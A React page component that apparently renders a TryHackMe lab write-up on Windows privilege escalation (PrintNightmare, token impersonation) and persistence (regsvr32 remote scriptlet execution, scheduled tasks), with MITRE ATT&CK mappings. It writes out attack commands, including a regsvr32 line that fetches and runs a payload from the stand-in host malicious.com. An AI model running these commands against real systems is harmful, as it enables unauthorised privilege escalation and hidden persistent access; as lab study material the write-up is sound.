import React from 'react';
import './CommonStyles.css';

const PrivilegeEscalationPersistence = () => {
  return (
    <div className="privilege-escalation-content">
      <div className="ctf-header">
        <h1>Privilege Escalation and Persistence</h1>
        <p>
          In another <strong>THM</strong> room, we explore methods for elevating privileges and establishing long-term access to a target system, using both known vulnerabilities and system management tools to avoid detection.
        </p>
      </div>

      <div className="content-section">
        <h3>Privilege Escalation</h3>
        <p>Our lesson starts where it gets fun! We researched and discovered a vulnerability.</p>
        <ul>
          <li>
            <strong>PrintNightmare (CVE-2021-34527):</strong> A vulnerability in the Windows Print Spooler that allows escalation to SYSTEM privileges.
            <p>Exploitation involves connecting to the remote print spooler service to overwrite system files.</p>
            <h4>Example Commands:</h4>
            <ul>
              <li>Verify if the Print Spooler service is running:
                <pre>sc query Spooler</pre>
              </li>
              <li>Exploit the vulnerability with Metasploit:
                <pre>use exploit/windows/local/printnightmare</pre>
              </li>
              <li>Alternatively, use PowerShell to deploy a malicious DLL:
                <pre>Invoke-PrintNightmare -DLLPath "C:\\malicious.dll"</pre>
              </li>
            </ul>
            <p><strong>Tool:</strong> Metasploit, PowerShell</p>
          </li>
          <li>
            <strong>Token Impersonation:</strong> An escalation technique to impersonate another user or system service for elevated privileges.
            <ul>
              <li>Using Metasploit's incognito module:
                <pre>use incognito; list_tokens -u; impersonate_token "DOMAIN\\User"</pre>
              </li>
            </ul>
            <p><strong>Tool:</strong> Metasploit (incognito)</p>
          </li>
        </ul>
      </div>

      <div className="content-section">
        <h3>Persistence Techniques</h3>
        <ul>
          <li>
            <strong>Regsvr32.exe (LOLBAS):</strong> Leverages Windows' Regsvr32 utility to execute code without raising alerts from whitelisting applications.
            <p>This technique runs payloads stored remotely, bypassing application controls.</p>
            <ul>
              <li>Execute a remote payload:
                <pre>regsvr32.exe /s /n /u /i:http://malicious.com/payload.sct scrobj.dll</pre>
              </li>
            </ul>
            <p><strong>Tool:</strong> Built-in Windows utility</p>
          </li>
          <li>
            <strong>Scheduled Tasks:</strong> Automates recurring execution of payloads for persistence.
            <ul>
              <li>Create a scheduled task:
                <pre>schtasks /create /tn "Updater" /tr "C:\\path\\to\\payload.exe" /sc daily /st 09:00</pre>
              </li>
              <li>Verify task creation:
                <pre>schtasks /query /tn "Updater"</pre>
              </li>
            </ul>
            <p><strong>Tool:</strong> Built-in Windows Task Scheduler</p>
          </li>
        </ul>
      </div>

      <div className="content-section">
        <h3>TTPs (Tactics, Techniques, and Procedures)</h3>
        <ul>
          <li><strong>T1068:</strong> Exploitation for Privilege Escalation – Utilizing vulnerabilities like PrintNightmare to gain higher privileges.</li>
          <li><strong>T1218.011:</strong> System Binary Proxy Execution (Regsvr32) – Bypassing application whitelisting through legitimate system binaries.</li>
          <li><strong>T1053.005:</strong> Scheduled Tasks – Using scheduled tasks to maintain access on the target system.</li>
        </ul>
      </div>

      <div className="ctf-summary">
        <h3>Conclusion</h3>
        <p>
          This phase of the engagement demonstrates how a red team can leverage privilege escalation vulnerabilities and persistence techniques to gain and maintain elevated access. Tools like Metasploit, PowerShell, and native Windows utilities are utilized to avoid detection, maintaining a balance between malicious intent and legitimate use.
        </p>
      </div>
    </div>
  );
};

export default PrivilegeEscalationPersistence;
